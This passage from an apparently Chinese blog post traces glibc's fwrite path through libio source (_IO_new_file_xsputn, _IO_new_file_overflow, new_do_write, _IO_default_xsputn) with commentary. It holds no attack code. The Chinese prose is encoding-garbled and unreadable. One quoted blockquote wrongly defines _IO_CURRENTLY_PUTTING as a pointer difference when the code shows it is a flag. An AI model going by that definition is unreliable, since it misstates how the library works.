class="keyword">endif</span></span></span><br><span class="line">      s += count;</span><br><span class="line">      to_do -= count;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (to_do + must_flush &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_size_t block_size, do_write;</span><br><span class="line">      <span class="comment">/* Next flush the (full) buffer. */</span></span><br><span class="line">      <span class="keyword">if</span> (_IO_OVERFLOW (f, EOF) == EOF)</span><br><span class="line">    <span class="comment">/* If nothing else has to be written we must not signal the</span></span><br><span class="line"><span class="comment">       caller that everything has been written.  */</span></span><br><span class="line">    <span class="keyword">return</span> to_do == <span class="number">0</span> ? EOF : n - to_do;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Try to maintain alignment: write a whole number of blocks.  */</span></span><br><span class="line">      block_size = f-&gt;_IO_buf_end - f-&gt;_IO_buf_base;</span><br><span class="line">      do_write = to_do - (block_size &gt;= <span class="number">128</span> ? to_do % block_size : <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (do_write)</span><br><span class="line">    &#123;</span><br><span class="line">      count = new_do_write (f, s, do_write);</span><br><span class="line">      to_do -= count;</span><br><span class="line">      <span class="keyword">if</span> (count &lt; do_write)</span><br><span class="line">        <span class="keyword">return</span> n - to_do;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Now write out the remainder.  Normally, this will fit in the</span></span><br><span class="line"><span class="comment">     buffer, but it&#x27;s somewhat messier for line-buffered files,</span></span><br><span class="line"><span class="comment">     so we let _IO_default_xsputn handle the general case. */</span></span><br><span class="line">      <span class="keyword">if</span> (to_do)</span><br><span class="line">    to_do -= _IO_default_xsputn (f, s+do_write, to_do);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> n - to_do;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_xsputn, _IO_file_xsputn)</span><br></pre></td></tr></table></figure><p>åˆšfopenå®Œæ­¤æ—¶å¤§éƒ¨åˆ†å­—æ®µä½NULL</p><img src="/2023/04/01/IO-FILE-fwrite/image-20230401153712485.png" alt="image-20230401153712485" style="zoom:80%;"><p>å‰é¢å‡ ä¸ªiféƒ½ä¸æˆç«‹ï¼Œæ¥åˆ°<code> if (to_do + must_flush &gt; 0)</code></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)</span></span><br></pre></td></tr></table></figure><p><mark>&#x3D;&#x3D;è°ƒç”¨è™šè¡¨ä¸­çš„__overflowï¼Œå³_IO_new_file_overflowå‡½æ•°ï¼Œç¬¬ä¸€å‚æ•°_IO_FILEæ–‡ä»¶æµç»“æ„ä½“ï¼Œç¬¬äºŒä¸ªå‚æ•° EOF(-1)&#x3D;&#x3D;<mark></mark></mark></p><h2 id="ç”³è¯·å¹¶åˆå§‹åŒ–ç¼“å†²åŒºï¼Œæ–‡ä»¶æµç»“æ„ä½“å®Œå–„"><a href="#ç”³è¯·å¹¶åˆå§‹åŒ–ç¼“å†²åŒºï¼Œæ–‡ä»¶æµç»“æ„ä½“å®Œå–„" class="headerlink" title="ç”³è¯·å¹¶åˆå§‹åŒ–ç¼“å†²åŒºï¼Œæ–‡ä»¶æµç»“æ„ä½“å®Œå–„"></a>ç”³è¯·å¹¶åˆå§‹åŒ–ç¼“å†²åŒºï¼Œæ–‡ä»¶æµç»“æ„ä½“å®Œå–„</h2><h4 id="x2F-libio-x2F-fileops-c-IO-new-file-overflow"><a href="#x2F-libio-x2F-fileops-c-IO-new-file-overflow" class="headerlink" title="&#x2F;libio&#x2F;fileops.c _IO_new_file_overflow"></a><strong>&#x2F;libio&#x2F;fileops.c</strong> _IO_new_file_overflow</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_new_file_overflow (_IO_FILE *f, <span class="type">int</span> ch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_doallocbuf (f);</span><br><span class="line">      _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);</span><br><span class="line">    &#125;</span><br><span class="line">      <span class="comment">/* Otherwise must be currently reading.</span></span><br><span class="line"><span class="comment">     If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,</span></span><br><span class="line"><span class="comment">     logically slide the buffer forwards one block (by setting the</span></span><br><span class="line"><span class="comment">     read pointers to all point at the beginning of the block).  This</span></span><br><span class="line"><span class="comment">     makes room for subsequent output.</span></span><br><span class="line"><span class="comment">     Otherwise, set the read pointers to _IO_read_end (leaving that</span></span><br><span class="line"><span class="comment">     alone, so it can continue to correspond to the external position). */</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (_IO_in_backup (f)))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">size_t</span> nbackup = f-&gt;_IO_read_end - f-&gt;_IO_read_ptr;</span><br><span class="line">      _IO_free_backup_area (f);</span><br><span class="line">      f-&gt;_IO_read_base -= MIN (nbackup,</span><br><span class="line">                   f-&gt;_IO_read_base - f-&gt;_IO_buf_base);</span><br><span class="line">      f-&gt;_IO_read_ptr = f-&gt;_IO_read_base;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end)</span><br><span class="line">    f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;</span><br><span class="line">      f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;</span><br><span class="line">      f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;</span><br><span class="line">      f-&gt;_IO_write_end = f-&gt;_IO_buf_end;</span><br><span class="line">      f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;</span><br><span class="line"></span><br><span class="line">      f-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">    f-&gt;_IO_write_end = f-&gt;_IO_write_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (ch == EOF)</span><br><span class="line">    <span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">             f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) <span class="comment">/* Buffer is really full */</span></span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush (f) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  *f-&gt;_IO_write_ptr++ = ch;</span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_UNBUFFERED)</span><br><span class="line">      || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == <span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> (_IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">              f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">char</span>) ch;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_overflow, _IO_file_overflow)</span><br></pre></td></tr></table></figure><p>å…ˆåˆ¤æ–­æ–‡ä»¶æµç»“æ„ä½“flagæ˜¯ä¸æ˜¯æœ‰ä¸å¯å†™å±æ€§è¿”å›EOF</p><p>æ£€æµ‹å—å¦æœ‰_IO_CURRENTLY_PUTTINGæˆ–_IO_write_baseæ˜¯å¦ä¸ºç©º</p><blockquote><p>IO_CURRENTLY_PUTTINGæ˜¯GNU Cåº“ä¸­ä½¿ç”¨çš„å®ï¼Œç”¨äºè¡¨ç¤ºFILEæµå½“å‰å†™å…¥æ•°æ®çš„è¾“å‡ºç¼“å†²åŒºä½ç½®ã€‚å®ƒçš„å®šä¹‰å¦‚ä¸‹ï¼š</p><p>#define IO_CURRENTLY_PUTTING(fp) ((fp)-&gt;_IO_write_ptr - (fp)-&gt;_IO_write_base)</p></blockquote><p>IO_write_baseä¸ºç©ºç¬¦åˆæ¡ä»¶è°ƒç”¨_IO_doallocbufåˆ†é…ç¼“å†²åŒºï¼Œfwriteåˆ†æè¿‡</p><p><mark>&#x3D;&#x3D;è°ƒç”¨è™šè¡¨ä¸­çš„__doallocateæŒ‡å‘çš„_IO_file_doallocateå‡½æ•°&#x3D;&#x3D;<mark></mark></mark></p><img src="/2023/04/01/IO-FILE-fwrite/image-20230401162158010.png" alt="image-20230401162158010" style="zoom: 80%;"><p>æ¥ä¸‹æ¥çš„_IO_setgä¹Ÿåœ¨freadé‡Œåˆ†æè¿‡_</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_setg(fp, eb, g, eg)  ((fp)-&gt;_IO_read_base = (eb),\</span></span><br><span class="line"><span class="meta">    (fp)-&gt;_IO_read_ptr = (g), (fp)-&gt;_IO_read_end = (eg))</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">((fp)-&gt;_IO_read_base = (fp-&gt;_IO_buf_base), (fp)-&gt;_IO_read_ptr = (fp-&gt;_IO_buf_base), (fp)-&gt;_IO_read_end = (fp-&gt;_IO_buf_base));</span><br></pre></td></tr></table></figure><p>_ä¹Ÿå°±æ˜¯æŠŠç»“æ„ä½“é‡Œçš„<strong>read</strong>ç›¸å…³çš„3ä¸ªæŒ‡é’ˆå‡åˆå§‹åŒ–ä¸ºIO_buf_base</p><img src="/2023/04/01/IO-FILE-fwrite/image-20230401164402279.png" alt="image-20230401164402279" style="zoom:80%;"><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_in_backup(fp) ((fp)-&gt;_flags &amp; _IO_IN_BACKUP)</span></span><br></pre></td></tr></table></figure><p>_IO_in_backupè¿™é‡Œä¸æˆç«‹ï¼Œæ¥åˆ°ç»™fpçš„writeç›¸å…³æŒ‡é’ˆèµ‹å€¼ï¼Œå¹¶è®¾ç½®_IO_CURRENTLY_PUTTING å±æ€§ï¼Œç”¨äºè¡¨ç¤ºå½“å‰æ­£åœ¨æ‰§è¡Œè¾“å‡ºæ“ä½œ</p><img src="/2023/04/01/IO-FILE-fwrite/image-20230401171509678.png" alt="image-20230401171509678" style="zoom:80%;"><h2 id="æ ¹æ®å¤„ç†æ•°æ®å¤§å°å’Œç¼“å†²åŒºå¤§å°å†³å®šå¾€ç¼“å†²åŒºé‡Œå†™æ•°æ®æˆ–ç›´æ¥å†™å…¥æ–‡ä»¶"><a href="#æ ¹æ®å¤„ç†æ•°æ®å¤§å°å’Œç¼“å†²åŒºå¤§å°å†³å®šå¾€ç¼“å†²åŒºé‡Œå†™æ•°æ®æˆ–ç›´æ¥å†™å…¥æ–‡ä»¶" class="headerlink" title="æ ¹æ®å¤„ç†æ•°æ®å¤§å°å’Œç¼“å†²åŒºå¤§å°å†³å®šå¾€ç¼“å†²åŒºé‡Œå†™æ•°æ®æˆ–ç›´æ¥å†™å…¥æ–‡ä»¶"></a>æ ¹æ®å¤„ç†æ•°æ®å¤§å°å’Œç¼“å†²åŒºå¤§å°å†³å®šå¾€ç¼“å†²åŒºé‡Œå†™æ•°æ®æˆ–ç›´æ¥å†™å…¥æ–‡ä»¶</h2><p>ch&#x3D;EOF(-1),æ‰§è¡Œ_IO_do_write(f, f-&gt;_IO_write_base,f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</p><h5 id="x2F-libio-x2F-fileops-cä¸­-IO-new-do-write"><a href="#x2F-libio-x2F-fileops-cä¸­-IO-new-do-write" class="headerlink" title="&#x2F;libio&#x2F;fileops.cä¸­**_IO_new_do_write**"></a><strong>&#x2F;libio&#x2F;fileops.c</strong>ä¸­**_IO_new_do_write**</h5><p>å‡½æ•°ç¬¬ä¸€ä¸ªå‚æ•°_IO_FILEæ–‡ä»¶æµç»“æ„ä½“ï¼Œç¬¬äºŒä¸ªå‚æ•°è¾“å‡ºç¼“å†²åŒºï¼Œç¬¬ä¸‰ä¸ªå‚æ•°ä¸º0</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_new_do_write _IO_do_write</span></span><br><span class="line">_IO_new_do_write (_IO_FILE *fp, <span class="type">const</span> <span class="type">char</span> *data, _IO_size_t to_do)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> (to_do == <span class="number">0</span></span><br><span class="line">      || (_IO_size_t) new_do_write (fp, data, to_do) == to_do) ? <span class="number">0</span> : EOF;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>todo&#x3D;&#x3D;0æˆç«‹ï¼Œç›´æ¥è¿”å›0ï¼Œå›åˆ°**_IO_new_file_xsputn**å‡½æ•°</p><p><code>if (_IO_OVERFLOW (f, EOF) == EOF)</code>ä¸æˆç«‹</p><p>è®¾ç½®blocksizeä¸ºç”³è¯·çš„ç¼“å†²åŒºå¤§å°</p><p><strong>do_write</strong>æ ¹æ®<code>do_write = to_do - (block_size &gt;= 128 ? to_do % block_size : 0);</code>èµ‹å€¼</p><h4 id="fwriteå†™å…¥å¤§å°å‚æ•°å°äºç”³è¯·çš„ç¼“å†²åŒºå¤§å°ï¼Œä¸€èˆ¬æœ€å¤šä¸º4kï¼Œæœ¬æµ‹è¯•ä¸º1k"><a href="#fwriteå†™å…¥å¤§å°å‚æ•°å°äºç”³è¯·çš„ç¼“å†²åŒºå¤§å°ï¼Œä¸€èˆ¬æœ€å¤šä¸º4kï¼Œæœ¬æµ‹è¯•ä¸º1k" class="headerlink" title="fwriteå†™å…¥å¤§å°å‚æ•°å°äºç”³è¯·çš„ç¼“å†²åŒºå¤§å°ï¼Œä¸€èˆ¬æœ€å¤šä¸º4kï¼Œæœ¬æµ‹è¯•ä¸º1k"></a>fwriteå†™å…¥å¤§å°å‚æ•°å°äºç”³è¯·çš„ç¼“å†²åŒºå¤§å°ï¼Œä¸€èˆ¬æœ€å¤šä¸º4kï¼Œæœ¬æµ‹è¯•ä¸º1k</h4><p>do_writeä¸º0</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (to_do)</span><br><span class="line">    to_do -= _IO_default_xsputn (f, s+do_write, to_do);</span><br></pre></td></tr></table></figure><p>è°ƒç”¨<strong>libio&#x2F;genops.c</strong>çš„_IO_default_xsputnç¬¬ä¸€ä¸ªå‚æ•°ä¸ºæ–‡ä»¶æµç»“æ„ä½“ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºå†…å­˜æ•°æ®èµ·å§‹ç‚¹ï¼Œç¬¬ä¸‰ä¸ªä¸ºè¾“å…¥å¤§å°size*count</p><p><img src="/2023/04/01/IO-FILE-fwrite/image-20230401175400733.png" alt="image-20230401175400733"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_size_t</span><br><span class="line">_IO_default_xsputn (_IO_FILE *f, <span class="type">const</span> <span class="type">void</span> *data, _IO_size_t n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *s = (<span class="type">char</span> *) data;</span><br><span class="line">  _IO_size_t more = n;</span><br><span class="line">  <span class="keyword">if</span> (more &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (;;)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Space available. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_ptr &lt; f-&gt;_IO_write_end)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_size_t count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr;</span><br><span class="line">      <span class="keyword">if</span> (count &gt; more)</span><br><span class="line">        count = more;</span><br><span class="line">      <span class="keyword">if</span> (count &gt; <span class="number">20</span>)</span><br><span class="line">        &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _LIBC</span></span><br><span class="line">          f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">          <span class="built_in">memcpy</span> (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">          f-&gt;_IO_write_ptr += count;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">          s += count;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (count)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="type">char</span> *p = f-&gt;_IO_write_ptr;</span><br><span class="line">          _IO_ssize_t i;</span><br><span class="line">          <span class="keyword">for</span> (i = count; --i &gt;= <span class="number">0</span>; )</span><br><span class="line">        *p++ = *s++;</span><br><span class="line">          f-&gt;_IO_write_ptr = p;</span><br><span class="line">        &#125;</span><br><span class="line">      more -= count;</span><br><span class="line">    &#125;</span><br><span class="line">      <span class="keyword">if</span> (more == <span class="number">0</span> || _IO_OVERFLOW (f, (<span class="type">unsigned</span> <span class="type">char</span>) *s++) == EOF)</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">      more--;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> n - more;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_default_xsputn)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¦‚æœè¦è¾“å…¥çš„æ•°æ®å°äºç¼“å†²åŒºå¤§å°åˆ™æŠŠè¾“å…¥å¤§å°ç½®ä¸ºè¾“å…¥çœŸå®æ•°æ®å¤§å°ï¼Œå¦åˆ™æŒ‰ç…§ç¼“å†²åŒºå¤§å°</p><ul><li><p>ä¸€æ¬¡è½¬ç§»å¤§äº20æ—¶</p><ul><li>é‡‡ç”¨memcopyï¼Œè¿›è¡Œä¼ è¾“</li></ul></li><li><p>ä¸€æ¬¡è½¬ç§»å¤§å°å°äº20æ—¶</p><ul><li>é‡‡ç”¨forå¾ªç¯è¿›è¡Œèµ‹å€¼</li></ul></li></ul><p>ç¼“å†²åŒºä¸å¤Ÿæ—¶ä¼š_IO_OVERFLOWåˆ·æ–°ç¼“å†²åŒº</p><p><img src="/2023/04/01/IO-FILE-fwrite/image-20230401182422401.png" alt="image-20230401182422401"></p><h4 id="fwriteå†™å…¥å¤§å°å‚æ•°å¤§äºç­‰äºç”³è¯·çš„ç¼“å†²åŒºå¤§å°ï¼Œä¸€èˆ¬æœ€å¤šä¸º4kï¼Œæœ¬æµ‹è¯•ä¸º1k"><a href="#fwriteå†™å…¥å¤§å°å‚æ•°å¤§äºç­‰äºç”³è¯·çš„ç¼“å†²åŒºå¤§å°ï¼Œä¸€èˆ¬æœ€å¤šä¸º4kï¼Œæœ¬æµ‹è¯•ä¸º1k" class="headerlink" title="fwriteå†™å…¥å¤§å°å‚æ•°å¤§äºç­‰äºç”³è¯·çš„ç¼“å†²åŒºå¤§å°ï¼Œä¸€èˆ¬æœ€å¤šä¸º4kï¼Œæœ¬æµ‹è¯•ä¸º1k"></a>fwriteå†™å…¥å¤§å°å‚æ•°å¤§äºç­‰äºç”³è¯·çš„ç¼“å†²åŒºå¤§å°ï¼Œä¸€èˆ¬æœ€å¤šä¸º4kï¼Œæœ¬æµ‹è¯•ä¸º1k</h4><p>do_writeä¸ºç¼“å†²åŒºå¤§å°çš„å€æ•°</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (do_write)&#123;</span><br><span class="line">      count = new_do_write (f, s, do_write);</span><br><span class="line">      to_do -= count;</span><br><span class="line">      <span class="keyword">if</span> (count &lt; do_write)</span><br><span class="line">        <span class="keyword">return</span> n - to_do;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>libio&#x2F;fileops.c</strong></p><p>new_do_writeç¬¬ä¸€ä¸ªå‚æ•°ä¸ºæ–‡ä»¶æµç»“æ„ä½“ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºå†…å­˜æ•°æ®èµ·å§‹ç‚¹ï¼Œç¬¬ä¸‰ä¸ªä¸ºè¾“å…¥å¤§å°do_write</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span></span><br><span class="line">_IO_size_t</span><br><span class="line"><span class="title function_">new_do_write</span> <span class="params">(_IO_FILE *fp, <span class="type">const</span> <span class="type">char</span> *data, _IO_size_t to_do)</span></span><br><span class="line">&#123;</span><br><span class="line">  _IO_size_t count;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line">    <span class="comment">/* On a system without a proper O_APPEND implementation,</span></span><br><span class="line"><span class="comment">       you would need to sys_seek(0, SEEK_END) here, but is</span></span><br><span class="line"><span class="comment">       not needed nor desirable for Unix- or Posix-like systems.</span></span><br><span class="line"><span class="comment">       Instead, just indicate that offset (before and after) is</span></span><br><span class="line"><span class="comment">       unpredictable. */</span></span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_off64_t new_pos</span><br><span class="line">    = _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (new_pos == _IO_pos_BAD)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      fp-&gt;_offset = new_pos;</span><br><span class="line">    &#125;</span><br><span class="line">  count = _IO_SYSWRITE (fp, data, to_do);</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_cur_column &amp;&amp; count)</span><br><span class="line">    fp-&gt;_cur_column = _IO_adjust_column (fp-&gt;_cur_column - <span class="number">1</span>, data, count) + <span class="number">1</span>;</span><br><span class="line">  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= <span class="number">0</span></span><br><span class="line">               &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">               ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end);</span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆæ£€æµ‹_IO_IS_APPENDINGæ ‡å¿—ä½å®ƒè¡¨ç¤ºæ–‡ä»¶æµçš„å½“å‰ä½ç½®æ˜¯å¦å¤„äºæ–‡ä»¶çš„æœ«å°¾ï¼Œå¹¶ä¸”æ–‡ä»¶ä»¥â€è¿½åŠ æ¨¡å¼â€æ‰“å¼€ã€‚</p><p>fp-&gt;_IO_read_end !&#x3D; fp-&gt;_IO_write_baseä¸ç›¸ç­‰æ—¶ä¼š_IO_SYSSEEK()</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_SYSSEEK(FP, OFFSET, MODE) JUMP2 (__seek, FP, OFFSET, MODE)</span></span><br></pre></td></tr></table></figure><p><mark>&#x3D;&#x3D;è°ƒç”¨è™šè¡¨é‡Œçš„seekå¯¹åº”çš„__GI__IO_file_seek&#x3D;&#x3D;<mark></mark></mark></p><p>ä¸è¿‡æ¡ä»¶ä¸æˆç«‹ï¼Œç›´æ¥è°ƒç”¨_IO_SYSWRITE</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_SYSWRITE(FP, DATA, LEN) JUMP2 (__write, FP, DATA, LEN)</span></span><br></pre></td></tr></table></figure><p><mark>&#x3D;&#x3D;è°ƒç”¨äº†vtableä¸­__writeå¯¹åº”çš„<code>_IO_new_file_write</code>&#x3D;&#x3D;<mark></mark></mark></p><p><strong>libio&#x2F;fileops.c</strong>ä¸­**_IO_new_file_write**</p><p>ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºæ–‡ä»¶æµç»“æ„ä½“ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºå†…å­˜æ•°æ®èµ·å§‹ç‚¹ï¼Œç¬¬ä¸‰ä¸ªä¸ºè¾“å…¥å¤§å°do_write</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_new_file_write (_IO_FILE *f, <span class="type">const</span> <span class="type">void</span> *data, _IO_ssize_t n)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_ssize_t to_do = n;</span><br><span class="line">  <span class="keyword">while</span> (to_do &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_ssize_t count = (__builtin_expect (f-&gt;_flags2</span><br><span class="line">                         &amp; _IO_FLAGS2_NOTCANCEL, <span class="number">0</span>)</span><br><span class="line">               ? write_not_cancel (f-&gt;_fileno, data, to_do)</span><br><span class="line">               : write (f-&gt;_fileno, data, to_do));</span><br><span class="line">      <span class="keyword">if</span> (count &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">      to_do -= count;</span><br><span class="line">      data = (<span class="type">void</span> *) ((<span class="type">char</span> *) data + count);</span><br><span class="line">    &#125;</span><br><span class="line">  n -= to_do;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_offset &gt;= <span class="number">0</span>)</span><br><span class="line">    f-&gt;_offset += n;</span><br><span class="line">  <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œç³»ç»Ÿè°ƒç”¨writeæŠŠæ•°æ®å†™å…¥æ–‡ä»¶ï¼Œ</p><p>è°ƒç”¨_IO_adjust_columnæ›´æ–°æ–‡ä»¶æµç»“æ„ä½“ä¸­çš„_cur_column</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span></span><br><span class="line">_IO_adjust_column (<span class="type">unsigned</span> start, <span class="type">const</span> <span class="type">char</span> *line, <span class="type">int</span> count)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *ptr = line + count;</span><br><span class="line">  <span class="keyword">while</span> (ptr &gt; line)</span><br><span class="line">    <span class="keyword">if</span> (*--ptr == <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">      <span class="keyword">return</span> line + count - ptr - <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> start + count;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_adjust_column)</span><br></pre></td></tr></table></figure><p>æœ´ç´ çš„é€šè¿‡æ£€æµ‹â€˜\nâ€™æ¥ç»Ÿè®¡å¢åŠ çš„è¡Œæ•°</p><p>æœªå¯¹é½çš„æ•°æ®å›åˆ° <strong>_IO_default_xsputn</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">if</span> (to_do)</span><br><span class="line">to_do -= _IO_default_xsputn (f, s+do_write, to_do);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>è°ƒç”¨_IO_default_xsputnï¼Œå’Œ&lt;çš„ä¸€æ ·è¿›å…¥ç¼“å†²åŒº</p><p><strong>å“å‘€ä½ å¹²å˜›ï¼Œçªç„¶æ„è¯†åˆ°ï¼Œå°äºç¼“å†²åŒºçš„å¤§å°çš„æ•°æ®åªæ˜¯è¢«é€è¿›äº†ç¼“å†²åŒºï¼Œæ²¡æœ‰è¢«å†™å…¥æ–‡ä»¶å•Šã€‚ã€‚ã€‚åˆ«æ€¥è¿˜æœ‰fcloseæ²¡æœ‰åˆ†æï¼Œè°çŸ¥é“æœªæ¥çš„fcloseä¼šå‘ç”Ÿä»€ä¹ˆå‘¢</strong></p><h2 id="fwrite-å‡½æ•°è°ƒç”¨çš„vtableå‡½æ•°"><a href="#fwrite-å‡½æ•°è°ƒç”¨çš„vtableå‡½æ•°" class="headerlink" title="fwrite å‡½æ•°è°ƒç”¨çš„vtableå‡½æ•°"></a>fwrite 